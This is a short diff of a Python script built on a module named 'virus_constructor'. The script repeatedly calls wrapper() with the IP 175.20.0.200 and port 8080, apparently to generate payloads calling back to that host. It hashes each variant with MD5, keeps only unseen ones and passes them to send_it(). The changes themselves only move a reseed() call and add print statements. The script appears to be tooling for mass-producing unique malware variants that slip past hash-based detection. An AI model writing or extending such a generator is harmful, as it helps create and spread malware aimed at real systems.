@@ -6,7 +6,6 @@ import hashlib
 # import virus_constructor as vc
 from virus_constructor import wrapper, reseed
 
-reseed()
 
 file = str(wrapper("175.20.0.200", "8080"))
 print(file)
@@ -72,18 +71,21 @@ def originality_check(hash_to_check, counter=0) -> bool:
 if __name__ == '__main__':
 #     uploadFile()
 #     # downloadFile()
+    reseed()
     from sys import argv
     if len(argv) == 2:
             for i in range(0, int(argv[1])):
                 x = wrapper("175.20.0.200", "8080")
                 # print(x)
                 y = str(hashlib.md5(x.encode("ascii")).hexdigest())
+                print(y)
                 if originality_check(y, i):
                     send_it()
     else:
         x = wrapper("175.20.0.200", "8080")
         # print(x)
         y = str(hashlib.md5(x.encode("ascii")).hexdigest())
+        print(y)
         if originality_check(y):
             send_it()
 
